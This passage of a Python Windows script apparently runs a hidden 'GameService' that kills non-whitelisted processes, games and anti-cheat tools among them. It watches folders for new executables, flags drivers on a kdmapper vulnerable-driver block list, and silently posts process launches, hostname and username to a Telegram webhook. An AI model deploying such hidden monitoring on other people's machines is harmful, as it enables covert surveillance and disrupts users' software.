    'msgpioclx.sys', 'hwpolicy.sys', 'swenum.sys', 'ks.sys', 'rdpbus.sys',
    'cdd.dll', 'pshed.dll', 'win32k.sys', 'win32kbase.sys', 'win32kbase_rs.sys',
    'win32kfull.sys', 'ci.dll', 'kd.dll', 'symcryptk.dll', 'ntdll.dll',
    'kernel32.dll', 'kernelbase.dll', 'advapi32.dll', 'msvcrt.dll', 'sechost.dll',
    'rpcrt4.dll', 'bcrypt.dll', 'ucrtbase.dll', 'crypt32.dll',
    'bcryptprimitives.dll', 'gdi32.dll', 'gdi32full.dll', 'user32.dll', 'win32u.dll',
    'ole32.dll', 'oleaut32.dll', 'combase.dll', 'msvcp_win.dll', 'shell32.dll',
    'cfgmgr32.dll', 'shlwapi.dll', 'setupapi.dll', 'devobj.dll', 'wintrust.dll',
    'cryptbase.dll', 'sspicli.dll', 'cryptsp.dll', 'rsaenh.dll',
    'kernel.appcore.dll', 'ntmarta.dll', 'wldp.dll', 'profapi.dll', 'winhttp.dll',
    'ws2_32.dll', 'dnsapi.dll', 'iphlpapi.dll', 'nsi.dll', 'dhcpcsvc.dll',
    'dhcpcsvc6.dll', 'winnsi.dll', 'mswsock.dll', 'fwpuclnt.sys', 'fwpkclnt.sys',
    'rasadhlp.dll', 'netapi32.dll', 'srvcli.dll', 'wkscli.dll', 'netutils.dll',
    'logoncli.dll', 'samcli.dll', 'samlib.dll', 'winsta.dll', 'uxtheme.dll',
    'dwmapi.dll', 'propsys.dll', 'version.dll', 'msimg32.dll', 'comctl32.dll',
    'imm32.dll', 'clbcatq.dll', 'dataexchange.dll', 'dcomp.dll',
    'twinapi.appcore.dll', 'rmclient.dll', 'textshaping.dll', 'directwrite.dll',
    'dwrite.dll', 'fontsub.dll', 'usp10.dll', 'd3d11.dll', 'dxgi.dll',
    'd3d10warp.dll', 'd3d9.dll', 'dxgkrnl.sys', 'dxgmms1.sys', 'dxgmms2.sys',
    'dxgwdm.sys', 'videoprt.sys', 'bam.sys', 'mup.sys', 'volume.sys', 'volmgrx.sys',
    'iorate.sys', 'tm.sys', 'tbs.sys', 'ucpd.sys', 'vfpext.sys', 'hvsocket.sys',
    'netbios.sys', 'beep.sys', 'clfs.sys', 'ksecdd.sys', 'ksecpkg.sys',
    'msseccore.sys', 'wdfilter.sys', 'ntosext.sys', 'globmerger.sys', 'cea.sys',
    'uiomap.sys', 'prm.sys', 'wdfldr.sys', 'ehstorclass.sys', 'ipf_cpu.sys',
    'dtt_sw.sys', 'tdx.sys', 'netio.sys',
}

LEGITIMATE_DRIVER_PATHS = (
    '\\windows\\system32\\drivers\\',
    '\\windows\\system32\\driverstore\\filerepository\\',
    '\\windows\\syswow64\\drivers\\',
    '\\program files\\',
    '\\program files (x86)\\',
)

KNOWN_KDMAP_DRIVERS = {
    'iqvw64e.sys', 'iqvw64.sys', 'dbutil_2_3.sys', 'rtcore64.sys', 'rtcore32.sys',
    'gpcidrv64.sys', 'ene.sys', 'eneio64.sys', 'asrdrv10.sys', 'asrdrv102.sys',
    'asrdrv103.sys', 'asrdrv104.sys', 'asrdrv106.sys', 'elbycdio.sys', 'capcom.sys',
    'amdryzenmasterdriver.sys', 'nvflash.sys', 'nvoclock.sys', 'msio64.sys',
    'msio32.sys', 'nchgbgame64.sys', 'piddrv64.sys', 'gameink.sys', 'ene2.sys',
    'hwos2ec7x64.sys', 'asromgdrv.sys', 'amifldrv64.sys', 'rtif.sys', 'rzpnk.sys',
    'dellbios.sys',
}

WATCH_DIRS = [
    os.path.expanduser('~\\Downloads'),
    os.environ.get('TEMP', ''),
    os.path.expanduser('~\\Desktop'),
]
EXECUTABLE_EXTS = {'.exe', '.sys', '.dll', '.bat', '.cmd', '.ps1', '.vbs', '.scr', '.tmp'}

# ============================================================================
# 10. ЛОГИРОВАНИЕ
# ============================================================================
LOG_FILE = os.path.join(os.environ.get('TEMP', ''), 'gameservice.log')
logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                   format='%(asctime)s [%(levelname)s] %(message)s', encoding='utf-8')
logger = logging.getLogger("GameService")

# ============================================================================
# 11. WINDOWS API
# ============================================================================
FILE_LIST_DIRECTORY = 0x0001
FILE_SHARE_READ = 0x00000001
FILE_SHARE_WRITE = 0x00000002
FILE_SHARE_DELETE = 0x00000004
OPEN_EXISTING = 3
FILE_FLAG_BACKUP_SEMANTICS = 0x02000000
FILE_NOTIFY_CHANGE_FILE_NAME = 0x00000001
FILE_NOTIFY_CHANGE_SIZE = 0x00000008
FILE_ACTION_ADDED = 0x00000001


def set_process_stealth() -> None:
    try:
        kernel32 = ctypes.windll.kernel32
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
        handle = kernel32.GetCurrentProcess()
        kernel32.SetPriorityClass(handle, 0x00000080)
    except Exception as e:
        logger.error(f"Stealth error: {e}")


# ============================================================================
# 12. ПРОВЕРКА ПРОЦЕССОВ
# ============================================================================
def is_critical_process(name: str, pid: int) -> bool:
    name_l = name.lower().strip()
    if pid in (0, 4):
        return True
    return name_l in CRITICAL_SYSTEM_PROCESSES


def is_own_process(name: str) -> bool:
    """Проверяет, является ли процесс своим (чекер/сервис)."""
    return name.lower().strip() in OWN_PROCESSES


def is_suspicious_process(name: str, path: str, pid: int) -> Tuple[bool, str]:
    name_l = name.lower().strip()
    path_l = normalize_path(path) if path else ""

    # 0. Свои процессы — НИКОГДА не считаем подозрительными
    if is_own_process(name):
        return False, 'Own process (GameChecker/GameService)'

    # 🆕 WSL-процессы разрешаем даже с пустым путём (системный компонент)
    if name_l in {'wsl.exe', 'wslhost.exe', 'wslservice.exe'}:
        return False, 'WSL system component'

    # 1. Критические системные процессы
    if is_critical_process(name, pid):
        return False, 'Critical system process'
    
    # 🆕 2. Специальная логика для игр/античитов с пустым путём
    # Если процесс в ALLOWED_PROCESSES или HIGH_RISK_PROCESSES, но путь ещё не получен —
    # НЕ блокируем, а даём время (2-3 цикла), чтобы путь появился
    HIGH_RISK_NAMES = {
        'rust.exe', 'rustclient.exe', 'valorant-win64-shipping.exe', 'valorant.exe',
        'cs2.exe', 'csgo.exe', 'dota2.exe', 'gta5.exe', 'escapefromtarkov.exe',
        'tarkov.exe', 'r5apex.exe', 'tslgame.exe', 'palworld-win64-shipping.exe',
        'deadbydaylight-win64-shipping.exe', 'easyanticheat.exe', 'easyanticheat_eos.exe',
        'beservice.exe', 'vgc.exe', 'vgtray.exe', 'faceitclient.exe',
    }
    
    if name_l in HIGH_RISK_NAMES and not path_l:
        # Путь ещё не получен — НЕ блокируем, ждём следующий цикл
        return False, 'Waiting for path (game/anticheat process)'

    # 3. Строгая проверка ALLOWED_PROCESSES (только если путь известен)
    if name_l in ALLOWED_PROCESSES and path_l:
        allowed_patterns = ALLOWED_PROCESSES[name_l]
        for pattern in allowed_patterns:
            if fnmatch.fnmatch(path_l, normalize_path(pattern)):
                return False, f"Allowed (path matches pattern)"
        return True, f"PATH SPOOFING! Expected: {allowed_patterns[0]}..., got: {path}"

    # 4. Базовая проверка по PROCESS_WHITELIST
    if name_l in PROCESS_WHITELIST:
        if path_l:
            if '/downloads/' in path_l or '/temp/' in path_l:
                return True, f"Known process from suspicious folder: {path}"
        return False, 'Process in whitelist'

    # 5. Фолбэк: путь в SAFE_DIRECTORIES
    if path_l:
        for safe_dir in SAFE_DIRECTORIES:
            norm_safe = normalize_path(safe_dir).rstrip('/*')
            if path_l == norm_safe or path_l.startswith(norm_safe + '/'):
                return False, f"In safe directory: {safe_dir}"

    # 6. Блокируем
    return True, "Unknown process or untrusted folder"

# ============================================================================
# 13. МОНИТОРИНГ ПРОЦЕССОВ
# ============================================================================
def get_running_processes() -> List[Tuple[str, str, int]]:
    processes = []
    script = 'Get-CimInstance Win32_Process | Select-Object Name,ExecutablePath,ProcessId | ForEach-Object { $n = if($_.Name){$_.Name}else{""}; $p = if($_.ExecutablePath){$_.ExecutablePath}else{""}; "$n|$p|$($_.ProcessId)" }'
    try:
        result = subprocess.run(
            ['powershell', '-NoProfile', '-NonInteractive', '-Command', script],
            capture_output=True, text=True, encoding='utf-8', errors='replace',
            timeout=15, creationflags=CREATE_NO_WINDOW
        )
        if result.returncode == 0 and result.stdout.strip():
            for line in result.stdout.strip().split('\n'):
                line = line.strip()
                if not line: continue
                parts = line.split('|')
                if len(parts) == 3:
                    try:
                        processes.append((parts[0].strip(), parts[1].strip(), int(parts[2].strip())))
                    except ValueError:
                        continue
    except Exception as e:
        logger.error(f"PowerShell error: {e}")
    return processes


_kernel32_err = ctypes.WinDLL('kernel32', use_last_error=True)
_kernel32_err.OpenProcess.argtypes = [ctypes.wintypes.DWORD, ctypes.wintypes.BOOL, ctypes.wintypes.DWORD]
_kernel32_err.OpenProcess.restype = ctypes.c_void_p
_kernel32_err.GetExitCodeProcess.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.wintypes.DWORD)]
_kernel32_err.GetExitCodeProcess.restype = ctypes.wintypes.BOOL
_kernel32_err.TerminateProcess.argtypes = [ctypes.c_void_p, ctypes.c_uint]
_kernel32_err.TerminateProcess.restype = ctypes.wintypes.BOOL
STILL_ACTIVE = 259
PROCESS_TERMINATE = 0x0001
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000


def _pid_alive(pid: int) -> Tuple[bool, str]:
    ctypes.set_last_error(0)
    h = _kernel32_err.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
    if not h:
        err = ctypes.get_last_error()
        if err == 5: return True, "alive, no access"
        return False, f"not opening (err {err})"
    code = ctypes.wintypes.DWORD(0)
    ok = _kernel32_err.GetExitCodeProcess(h, ctypes.byref(code))
    _kernel32_err.CloseHandle(h)
    if not ok: return False, "exit code failed"
    return (code.value == STILL_ACTIVE), f"exit code {code.value}"


def _kill_via_winapi(pid: int) -> Tuple[bool, str]:
    ctypes.set_last_error(0)
    h = _kernel32_err.OpenProcess(PROCESS_TERMINATE, False, pid)
    if not h: return False, f"OpenProcess err {ctypes.get_last_error()}"
    ok = _kernel32_err.TerminateProcess(h, 1)
    err = ctypes.get_last_error()
    _kernel32_err.CloseHandle(h)
    return (ok != 0), (f"OK" if ok else f"Terminate err {err}")


def kill_process(pid: int, name: str, path: str = "", reason: str = "", is_high_risk: bool = False) -> bool:
    # 🆕 Свои процессы не убиваем
    if is_own_process(name):
        logger.info(f"Skipping own process: {name} (PID: {pid})")
        return False
    
    if is_critical_process(name, pid):
        logger.info(f"Skipping critical: {name} (PID: {pid})")
        return False
    
    final_success = False
    last_note = ""
    
    for attempt in range(3):
        try:
            subprocess.run(['taskkill', '/f', '/pid', str(pid)], 
                          capture_output=True, text=True, timeout=5, 
                          creationflags=CREATE_NO_WINDOW)
        except Exception:
            pass
        
        time.sleep(0.4)
        alive, last_note = _pid_alive(pid)
        if not alive:
            logger.info(f"Killed: {name} (PID: {pid})")
            final_success = True
            break
            
        _kill_via_winapi(pid)
        time.sleep(0.4)
        alive, last_note = _pid_alive(pid)
        if not alive:
            logger.info(f"Killed (WinAPI): {name} (PID: {pid})")
            final_success = True
            break

    if is_high_risk:
        if final_success:
            send_telegram_event("HIGH_RISK_BLOCKED", {
                "process_name": name, "process_path": path, 
                "pid": pid, "reason": reason,
            })
        else:
            send_telegram_event("HIGH_RISK_BLOCK_FAILED", {
                "process_name": name, "process_path": path, 
                "pid": pid, "reason": f"{reason} | Failed: {last_note}",
            })
    
    if not final_success:
        logger.error(f"Failed to kill: {name} (PID {pid}) | {last_note}")
    
    return final_success


_seen_processes: Set[Tuple[str, str]] = set()
_pathless_attempts: Dict[int, int] = {}  # PID -> количество циклов без пути


def monitor_processes_loop():
    logger.info("Process monitor started")
    cycle, attempts, dead = 0, {}, set()
    initial_scan_done = False  # 🆕 Флаг первого сканирования
    
    HIGH_RISK_PROCESSES = {
        'rust.exe', 'rustclient.exe', 'valorant-win64-shipping.exe', 'valorant.exe',
        'cs2.exe', 'csgo.exe', 'dota2.exe', 'gta5.exe', 'escapefromtarkov.exe',
        'tarkov.exe', 'r5apex.exe', 'tslgame.exe', 'palworld-win64-shipping.exe',
        'deadbydaylight-win64-shipping.exe', 'easyanticheat.exe', 'easyanticheat_eos.exe',
        'beservice.exe', 'vgc.exe', 'vgtray.exe', 'faceitclient.exe',
    }
    
    while True:
        cycle += 1
        try:
            processes = get_running_processes()
            
            # 🆕 ПЕРВЫЙ ЦИКЛ: заполняем _seen_processes БЕЗ отправки в Telegram
            # Это убирает спам — все процессы, которые уже работали до запуска сервиса,
            # не будут отправляться как "новые"
            if not initial_scan_done:
                for name, path, pid in processes:
                    process_key = (name.lower(), path.lower())
                    _seen_processes.add(process_key)
                initial_scan_done = True
                logger.info(f"Initial scan: {len(processes)} processes added to seen set (no Telegram spam)")
                time.sleep(1.0)
                continue
            
            if cycle % 10 == 1: 
                logger.info(f"Cycle {cycle}: {len(processes)} processes")
            
            for name, path, pid in processes:
                if pid in dead: 
                    continue
                
                process_key = (name.lower(), path.lower())
                
                # Свои процессы — пропускаем полностью
                if is_own_process(name):
                    if process_key not in _seen_processes:
                        _seen_processes.add(process_key)
                    continue
                
                # 🆕 НОВЫЙ ПРОЦЕСС — отправляем в Telegram
                if process_key not in _seen_processes:
                    _seen_processes.add(process_key)
                    logger.info(f"LAUNCHED: {name} (PID: {pid}) | Path: {path or 'N/A'}")
                    
                    send_telegram_event("PROCESS_LAUNCHED", {
                        "process_name": name,
                        "process_path": path or "N/A",
                        "pid": pid,
                    })
                
                suspicious, reason = is_suspicious_process(name, path, pid)
                
                if suspicious and not is_critical_process(name, pid):
                    name_l = name.lower().strip()
                    is_high_risk = name_l in HIGH_RISK_PROCESSES or "PATH SPOOFING" in reason or "ПОДМЕНА ПУТИ" in reason
                    
                    # 🆕 Для HIGH_RISK с пустым путём — ждём 3 цикла

                    
                    if is_high_risk:
                        logger.warning(f"CRITICAL BLOCK: {name} (PID: {pid}) | {reason}")
                    else:
                        logger.warning(f"BLOCK: {name} (PID: {pid}) | {reason}")
                    
                    if attempts.get(pid, 0) >= 3: 
                        continue
                    attempts[pid] = attempts.get(pid, 0) + 1
                    
                    killed = kill_process(pid, name, path, reason, is_high_risk=is_high_risk)
                    
                    if killed:
                        dead.add(pid)
                        # 🆕 Удаляем из pathless_attempts если процесс убит
                        if pid in _pathless_attempts:
                            del _pathless_attempts[pid]
                        event_name = "HIGH_RISK_BLOCKED" if is_high_risk else "PROCESS_BLOCKED"
                        send_telegram_event(event_name, {
                            "process_name": name,
                            "process_path": path,
                            "pid": pid,
                            "reason": reason,
                        })
                    else:
                        if is_high_risk:
                            send_telegram_event("HIGH_RISK_BLOCK_FAILED", {
                                "process_name": name,
                                "process_path": path,
                                "pid": pid,
                                "reason": reason,
                            })
                        
        except Exception as e:
            logger.error(f"Monitor error: {e}")
        time.sleep(1.0)


# ============================================================================
# 14. МОНИТОРИНГ ФАЙЛОВ
# ============================================================================
def watch_directory(directory: str, stop_event: threading.Event):
    try:
        kernel32 = ctypes.windll.kernel32
        hDir = kernel32.CreateFileW(directory, FILE_LIST_DIRECTORY,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            None, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, None)
        if hDir == ctypes.wintypes.HANDLE(-1).value:
            logger.error(f"Cannot open dir: {directory}")
            return
        buffer_size = 65536
        buffer = (ctypes.c_char * buffer_size)()
        bytes_returned = ctypes.c_ulong(0)
        logger.info(f"Watching: {directory}")
        while not stop_event.is_set():
            result = kernel32.ReadDirectoryChangesW(hDir, buffer, buffer_size, True,
                FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_SIZE,
                ctypes.byref(bytes_returned), None, None)
            if result and bytes_returned.value > 0:
                offset = 0
                while offset < bytes_returned.value:
                    header = buffer[offset:offset+12]
                    if len(header) < 12: break
                    next_offset, action, filename_length = struct.unpack(
                        '<III', bytes(buffer[offset:offset+12]))
                    if action == FILE_ACTION_ADDED:
                        filename_start = offset + 12
                        filename_end = filename_start + filename_length
                        filename_bytes = bytes(buffer[filename_start:filename_end])
                        try:
                            filename = filename_bytes.decode('utf-16le').strip('\x00')
                            if '__PSScriptPolicyTest' not in filename:
                                ext = os.path.splitext(filename)[1].lower()
                                if ext in EXECUTABLE_EXTS:
                                    logger.info(f"File created: {os.path.join(directory, filename)}")
                        except UnicodeDecodeError:
                            pass
                    if next_offset == 0: break
                    offset += next_offset
        kernel32.CloseHandle(hDir)
    except Exception as e:
        logger.error(f"Watch error {directory}: {e}")


def monitor_files_loop():
    stop_event = threading.Event()
    threads = []
    for watch_dir in WATCH_DIRS:
        if not os.path.isdir(watch_dir): continue
        t = threading.Thread(target=watch_directory, args=(watch_dir, stop_event), daemon=True)
        t.start()
        threads.append(t)
    logger.info(f"Started {len(threads)} file watchers")
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()


# ============================================================================
# 15. TELEGRAM
# ============================================================================
_event_last_sent: dict = {}


def send_telegram_event(event: str, data: dict) -> None:
    if not TELEGRAM_ENABLED: 
        return
    
    if event == "PROCESS_LAUNCHED":
        event_key = f"{event}:{data.get('process_name', '')}"
        now = time.time()
        last = _event_last_sent.get(event_key, 0)
        if now - last < EVENT_COOLDOWN:
            return
        _event_last_sent[event_key] = now
    
    data['event'] = event
    data['secret'] = GAS_SECRET
    data['timestamp'] = dt.datetime.now().isoformat()
    data['hostname'] = platform.node()
    data['username'] = getpass.getuser()
    
    def _send():
        try:
            payload = json.dumps(data, ensure_ascii=False).encode('utf-8')
            req = urllib.request.Request(
                GAS_WEBHOOK_URL, data=payload,
                headers={'Content-Type': 'application/json'}, method='POST'
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                logger.info(f"Sent: {event} (HTTP {resp.status})")
        except Exception as e:
            logger.error(f"Telegram error: {e}")
    
    threading.Thread(target=_send, daemon=True).start()


# ============================================================================
# 16. МОНИТОРИНГ ДРАЙВЕРОВ
# ============================================================================
def _list_loaded_drivers() -> List[Tuple[str, str, str]]:
    try:
        psapi = ctypes.windll.psapi
        psapi.EnumDeviceDrivers.argtypes = [ctypes.POINTER(ctypes.c_size_t),
            ctypes.wintypes.DWORD, ctypes.POINTER(ctypes.wintypes.DWORD)]
        psapi.EnumDeviceDrivers.restype = ctypes.wintypes.BOOL
        psapi.GetDeviceDriverFileNameW.argtypes = [ctypes.c_size_t, ctypes.c_wchar_p,
            ctypes.wintypes.DWORD]
        psapi.GetDeviceDriverFileNameW.restype = ctypes.wintypes.DWORD
        needed = ctypes.wintypes.DWORD(0)
        ret = psapi.EnumDeviceDrivers(None, 0, ctypes.byref(needed))
        if not ret or needed.value == 0: return []
        ptr_size = ctypes.sizeof(ctypes.c_size_t)
        count = needed.value // ptr_size
        ArrayType = ctypes.c_size_t * count
        addresses = ArrayType()
        needed2 = ctypes.wintypes.DWORD(0)
        ret = psapi.EnumDeviceDrivers(
            ctypes.cast(addresses, ctypes.POINTER(ctypes.c_size_t)),
            needed.value, ctypes.byref(needed2))
        if not ret: return []
        drivers = []
        buf = ctypes.create_unicode_buffer(1024)
        for addr in addresses:
            if not addr or addr == 0: continue
            try:
                buf.value = ''
                result = psapi.GetDeviceDriverFileNameW(addr, buf, 1024)
                if result > 0:
                    raw_path = buf.value
                    name = os.path.basename(raw_path) if raw_path else ""
                    base_addr = hex(addr)
                    drivers.append((name, raw_path, base_addr))
            except (OverflowError, ValueError, OSError):
                continue
        return drivers
    except Exception as e:
        logger.error(f"Driver enum error: {e}")
        return []


def _normalize_driver_path(raw_path: str) -> str:
    if not raw_path: return ""
    p = raw_path
    systemroot = os.environ.get('SystemRoot', 'C:\\Windows')
    lower = p.lower()
    if lower.startswith('\\systemroot'): p = systemroot + p[11:]
    elif lower.startswith('systemroot'): p = systemroot + '\\' + p[10:]
    if p.startswith('\\??\\') or p.startswith('\\\\?\\'): p = p[4:]
    if p.lower().startswith('system32\\'): p = systemroot + '\\' + p
    return p


def _is_legitimate_driver(name: str, path: str) -> bool:
    name_l = name.lower()
    if name_l in LEGITIMATE_DRIVERS: return True
    path_l = _normalize_driver_path(path).lower()
    for legit_path in LEGITIMATE_DRIVER_PATHS:
        if legit_path in path_l: return True
    system_dll_paths = ['\\windows\\system32\\', '\\windows\\syswow64\\',
                       '\\windows\\system32\\driverstore\\', '\\windows\\winsxs\\']
    if any(sp in path_l for sp in system_dll_paths): return True
    return False


def _is_known_kdmapper_driver(name: str) -> bool:
    return name.lower() in KNOWN_KDMAP_DRIVERS


_seen_drivers: Set[str] = set()
_drivers_lock = threading.Lock()


def monitor_drivers_loop():
    logger.info("Driver monitor started")
    while True:
        try:
            drivers = _list_loaded_drivers()
            for name, raw_path, base_addr in drivers:
                with _drivers_lock:
                    if name.lower() in _seen_drivers: 
                        continue
                    _seen_drivers.add(name.lower())
                
                logger.info(f"Driver loaded: {name} | Path: {raw_path} | Addr: {base_addr}")
                
                is_legit = _is_legitimate_driver(name, raw_path)
                if is_legit: 
                    continue
                
                path = _normalize_driver_path(raw_path)
                is_kdmapper = _is_known_kdmapper_driver(name)
                
                reason_parts = []
                if is_kdmapper: 
                    reason_parts.append("Known kdmapper driver")
                if not path.lower().startswith("c:\\windows"): 
                    reason_parts.append("Non-standard path")
                reason = "; ".join(reason_parts) if reason_parts else "Not in whitelist"
                
                send_telegram_event("SUSPICIOUS_DRIVER_LOADED", {
                    "driver_name": name, "driver_path": path,
                    "base_address": base_addr, "reason": reason,
                })
                
                logger.warning(f"Suspicious driver: {name} | Path: {path} | Reason: {reason}")
        except Exception as e:
            logger.error(f"Driver monitor error: {e}")
        time.sleep(5)


# ============================================================================
# 17. ТОЧКА ВХОДА
# ============================================================================
def main():
    if not _acquire_mutex("Global\\GameService_Worker"):
        logger.info("Worker already running")
        sys.exit(0)
    set_process_stealth()
    logger.info("=" * 60)
    logger.info("GameService started")
    logger.info("=" * 60)
    send_telegram_event("STARTUP", {"message": "GameService started. Monitoring processes."})
    threading.Thread(target=monitor_processes_loop, daemon=True).start()
    threading.Thread(target=monitor_drivers_loop, daemon=True).start()
    monitor_files_loop()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logger.info("Stopped by user")
    except Exception as e:
        logger.critical(f"Fatal error: {e}")